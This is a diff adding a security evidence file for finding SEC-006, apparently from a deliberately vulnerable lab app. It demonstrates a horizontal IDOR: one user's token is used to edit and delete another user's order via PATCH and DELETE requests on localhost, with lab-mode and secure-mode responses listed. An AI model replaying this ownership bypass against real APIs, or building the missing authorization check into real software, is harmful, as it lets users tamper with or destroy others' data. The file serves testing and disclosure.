@@ -1,0 +1,24 @@
+### SEC-006 evidence — horizontal write IDOR on orders (lab mode)
+
+# 1) Login as alice (owner of orders 101/102, NOT order 201)
+POST http://127.0.0.1:8000/api/login
+Content-Type: application/json
+
+{"username":"alice","password":"password123"}
+
+# 2) Mutate bob's order notes with alice's token
+PATCH http://127.0.0.1:8000/api/orders/201
+Authorization: Bearer lab-token-alice
+Content-Type: application/json
+
+{"notes":"hijacked by alice"}
+
+# Lab: HTTP 200, notes replaced, owner_id remains 2
+# Secure (LAB_MODE=false): HTTP 403 Forbidden
+
+# 3) Unauthorized delete of bob's order
+DELETE http://127.0.0.1:8000/api/orders/201
+Authorization: Bearer lab-token-alice
+
+# Lab: HTTP 200 {"detail":"deleted","id":201}
+# Secure: HTTP 403; order 201 still readable by bob
